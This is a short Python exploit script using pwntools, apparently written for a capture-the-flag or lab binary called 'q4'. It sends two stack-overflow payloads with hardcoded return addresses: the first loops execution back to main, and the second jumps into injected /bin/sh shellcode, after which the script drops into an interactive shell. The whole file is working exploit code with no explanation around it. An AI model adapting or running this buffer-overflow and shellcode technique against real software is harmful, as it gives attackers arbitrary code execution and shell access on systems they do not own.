from pwn import *

main = 0x4000c7
msg = 0x6000ec

context.clear(arch='amd64')
shellcode = asm(shellcraft.sh())

pty = process.PTY
p = process('./q4', stdin=pty, stdout=pty)
# context.terminal = ['termite', '-e']
# p = gdb.debug('./q4', stdin=pty, stdout=pty)

p.sendline('A' * 16 + p64(msg) + p64(main))
p.sendline('A' * 24 + p64(msg+0x10) + shellcode)
p.interactive()